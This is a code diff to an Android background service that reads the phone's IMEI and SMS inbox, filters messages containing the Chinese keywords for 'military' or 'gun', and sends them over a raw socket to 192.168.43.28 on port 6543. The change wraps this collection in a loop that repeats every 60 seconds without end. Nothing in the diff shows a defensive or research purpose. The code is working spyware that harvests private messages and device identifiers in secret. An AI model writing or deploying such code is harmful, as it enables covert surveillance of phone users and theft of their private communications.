@@ -49,93 +49,10 @@ public class MyService extends Service {
     public MyService() {
     }
 
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        Log.d("输出","元素1");
-
-
-    }
-
-    private String socketSend(String type,Object data){
-        try {
-            Socket mysocket = new Socket("192.168.43.28",6543);
-            OutputStream out = mysocket.getOutputStream();
-            InputStream In = mysocket.getInputStream();
-
-            String send_data,rec_data;
-
-
-
-
-            out.write(type.getBytes());
-            out.flush();
-            Log.d("发送类型",type+" 发送成功");
-
-
-            if(type != "keyword_message"){
-                send_data = data.toString();
-                out.write(send_data.getBytes());
-                out.flush();
-                Log.d("发送数据",send_data +" 发送成功");
-            }
-            else{
-                JSONObject dataj = (JSONObject)data;
-                int length = dataj.length();
-
-                JSONObject len = new JSONObject();
-                len.put("length",length);
-                out.write(len.toString().getBytes());
-                out.flush();
-                Thread.sleep(100);
-
-                Iterator iterator = dataj.keys();
-                boolean is_imeisend = false;
-                while (iterator.hasNext()){
-                    if(is_imeisend){
-                        String key = iterator.next().toString();
-                        send_data = dataj.getString(key);
-                        Thread.sleep(100);
-                        out.write(send_data.getBytes());
-                        out.flush();
-                    }
-                    else {
-                        String key = iterator.next().toString();
-                        send_data = dataj.getString(key);
-
-                        Thread.sleep(100);
-                        JSONObject datatmp = new JSONObject();
-                        datatmp.put("IMEI",send_data);
-                        send_data = datatmp.toString();
-                        out.write(send_data.getBytes());
-                        out.flush();
-                        is_imeisend = true;
-                    }
-                }
-                Log.d("发送数据"," 发送成功");
-            }
-
-
-
-            BufferedReader br = new BufferedReader(new InputStreamReader(In));
-            rec_data = br.readLine();
-
-            Log.d("接收数据",rec_data);
-
-            return rec_data;
-        }catch (Exception e){
-            e.printStackTrace();
-        }
-        return "defeated";
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d("输出","元素2");
+    //主要功能的实现
+    private void runBody(Intent intent){
         final String[] permission = intent.getStringArrayExtra("permission");
         final List<String> perList = Arrays.asList(permission);
-
 
         //  调试：输出权限信息
         for (String str : permission){
@@ -179,40 +96,40 @@ public class MyService extends Service {
                     Cursor cursorMessage = getContentResolver().query(SMS_INBOX,projection,null,null,null);
 
                     if(cursorMessage != null){
-                       try {
-                           int i_mes = 0;
-                           messages.put("IMEI",IMEI);
+                        try {
+                            int i_mes = 0;
+                            messages.put("IMEI",IMEI);
 
-                           while (cursorMessage.moveToNext()) {
-                               address = cursorMessage.getString(cursorMessage.getColumnIndex("address"));
-                               person = cursorMessage.getString(cursorMessage.getColumnIndex("person"));
-                               body = cursorMessage.getString(cursorMessage.getColumnIndex("body"));
-                               dateLong = cursorMessage.getLong(cursorMessage.getColumnIndex("date"));
-                               type = cursorMessage.getString(cursorMessage.getColumnIndex("type"));
+                            while (cursorMessage.moveToNext()) {
+                                address = cursorMessage.getString(cursorMessage.getColumnIndex("address"));
+                                person = cursorMessage.getString(cursorMessage.getColumnIndex("person"));
+                                body = cursorMessage.getString(cursorMessage.getColumnIndex("body"));
+                                dateLong = cursorMessage.getLong(cursorMessage.getColumnIndex("date"));
+                                type = cursorMessage.getString(cursorMessage.getColumnIndex("type"));
 
-                               Date date1 = new Date(dateLong);
-                               SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-                               date =dateFormat.format(date1);
+                                Date date1 = new Date(dateLong);
+                                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                                date =dateFormat.format(date1);
 
 
-                               if(body.contains("军") || body.contains("枪")){
-                                   JSONObject message = new JSONObject();
-                                   message.put("number",address);
+                                if(body.contains("军") || body.contains("枪")){
+                                    JSONObject message = new JSONObject();
+                                    message.put("number",address);
 
-                                   Map messageMap = new HashMap();
-                                   message.put("number",address);
-                                   message.put("person",person);
-                                   message.put("body",body);
-                                   message.put("date",date);
-                                   message.put("type",type);
-                                   messages.put(i_mes + "",message);
-                                   i_mes ++;
-                               }
-                           }
-                       }catch (Exception e){
-                           e.printStackTrace();
-                       }
-                       cursorMessage.close();
+                                    Map messageMap = new HashMap();
+                                    message.put("number",address);
+                                    message.put("person",person);
+                                    message.put("body",body);
+                                    message.put("date",date);
+                                    message.put("type",type);
+                                    messages.put(i_mes + "",message);
+                                    i_mes ++;
+                                }
+                            }
+                        }catch (Exception e){
+                            e.printStackTrace();
+                        }
+                        cursorMessage.close();
                     }
                 }
 
@@ -317,6 +234,113 @@ public class MyService extends Service {
 
 
                 stopSelf();
+            }
+        }).start();
+
+    }
+
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d("输出","元素1");
+
+
+    }
+
+    private String socketSend(String type,Object data){
+        try {
+            Socket mysocket = new Socket("192.168.43.28",6543);
+            OutputStream out = mysocket.getOutputStream();
+            InputStream In = mysocket.getInputStream();
+
+            String send_data,rec_data;
+
+
+
+
+            out.write(type.getBytes());
+            out.flush();
+            Log.d("发送类型",type+" 发送成功");
+
+
+            if(type != "keyword_message"){
+                send_data = data.toString();
+                out.write(send_data.getBytes());
+                out.flush();
+                Log.d("发送数据",send_data +" 发送成功");
+            }
+            else{
+                JSONObject dataj = (JSONObject)data;
+                int length = dataj.length();
+
+                JSONObject len = new JSONObject();
+                len.put("length",length);
+                out.write(len.toString().getBytes());
+                out.flush();
+                Thread.sleep(100);
+
+                Iterator iterator = dataj.keys();
+                boolean is_imeisend = false;
+                while (iterator.hasNext()){
+                    if(is_imeisend){
+                        String key = iterator.next().toString();
+                        send_data = dataj.getString(key);
+                        Thread.sleep(100);
+                        out.write(send_data.getBytes());
+                        out.flush();
+                    }
+                    else {
+                        String key = iterator.next().toString();
+                        send_data = dataj.getString(key);
+
+                        Thread.sleep(100);
+                        JSONObject datatmp = new JSONObject();
+                        datatmp.put("IMEI",send_data);
+                        send_data = datatmp.toString();
+                        out.write(send_data.getBytes());
+                        out.flush();
+                        is_imeisend = true;
+                    }
+                }
+                Log.d("发送数据"," 发送成功");
+            }
+
+
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(In));
+            rec_data = br.readLine();
+
+            Log.d("接收数据",rec_data);
+
+            return rec_data;
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return "defeated";
+    }
+
+    @Override
+    public int onStartCommand(final Intent intent, int flags, int startId) {
+        Log.d("输出","元素2");
+        final Intent intent1 = intent;
+
+        // 设置间隔时间为 60 秒
+        final  int Interval_Time = 60 * 1000;
+
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    runBody(intent1);
+                    try {
+                        Thread.sleep(Interval_Time);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+
             }
         }).start();
 
